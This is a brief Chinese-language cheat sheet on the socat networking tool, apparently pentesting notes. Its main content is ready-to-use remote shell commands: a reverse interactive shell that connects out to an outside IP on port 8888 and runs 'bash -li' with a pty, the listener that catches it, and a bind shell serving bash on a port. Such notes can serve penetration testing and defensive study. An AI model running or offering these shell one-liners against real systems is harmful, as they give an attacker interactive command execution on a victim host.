# socat

```
一款比 nc 更加强大的网络工具
名称来源于 socket cat
```

#### 命令

反弹一个交互式的 shell
```
连接 : 
socat tcp-connect:8.8.8.8:8888 exec:'bash -li',pty,stderr,setsid,sigint,sane
监听 : 
socat file:`tty`,raw,err,echo=0 tcp-l:6666
```

正向 shell
```
socat tcp-l:8888,fork,reuseaddr exec:./bash 
```

#### 参考文献
> http://www.dest-unreach.org/socat/
